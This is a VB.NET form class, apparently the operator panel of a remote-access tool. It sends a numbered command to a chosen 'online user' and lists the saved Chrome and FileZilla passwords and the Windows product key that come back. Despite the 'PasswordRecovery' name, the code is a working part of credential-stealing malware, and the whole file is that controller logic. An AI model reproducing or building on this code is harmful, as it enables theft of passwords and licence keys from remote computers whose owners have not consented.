Public Class PasswordRecovery

    Private Sub CheckBoxConfirmUsage_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBoxConfirmUsage.CheckedChanged
        If CheckBoxConfirmUsage.Checked Then
            Button1.Enabled = True
            ListViewPasswords.Enabled = True
        Else
            ListViewPasswords.Items.Clear()
            Button1.Enabled = False
            ListViewPasswords.Enabled = False
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Requesting passwords...")
        ListViewPasswords.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|63")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Passwordmanager")
        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Settings.TabControl1.SelectedIndex = 0
        Settings.ShowDialog()
    End Sub

    Public Sub SplitData(ByVal Data As String)
        If Data = Nothing Then
            MsgBox("Couldn't recieve data. Please retry.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        ListViewPasswords.Items.Clear()

        'Split recieved data into lsitview 

        Dim lines() = Data.Split({"||||"}, StringSplitOptions.None)
        For Each line In lines
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewPasswords.Items.Add(parts(0), 0)
            For i = 1 To Math.Min(parts.Length - 1, 3)
                Dim PIDcheck As String = parts(i)
                item.SubItems.Add(parts(i))
            Next
        Next
        For Each item As ListViewItem In ListViewPasswords.Items
            If item.Text = "Chrome" Then
                item.ImageIndex = 0
            ElseIf item.Text = "FileZilla" Then
                item.ImageIndex = 1
            ElseIf item.Text = "Windowskey" Then
                item.ImageIndex = 2
            End If
            If (String.IsNullOrWhiteSpace(item.Text) Or String.IsNullOrEmpty(item.Text)) Then
                item.Remove()
            End If
        Next
    End Sub


    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        If CheckBoxConfirmUsage.Checked = False Then
            CheckBoxConfirmUsage.Checked = True
        Else
            CheckBoxConfirmUsage.Checked = False
        End If
    End Sub
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        If CheckBoxConfirmUsage.Checked = False Then
            CheckBoxConfirmUsage.Checked = True
        Else
            CheckBoxConfirmUsage.Checked = False
        End If
    End Sub
    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        If CheckBoxConfirmUsage.Checked = False Then
            CheckBoxConfirmUsage.Checked = True
        Else
            CheckBoxConfirmUsage.Checked = False
        End If
    End Sub
End Class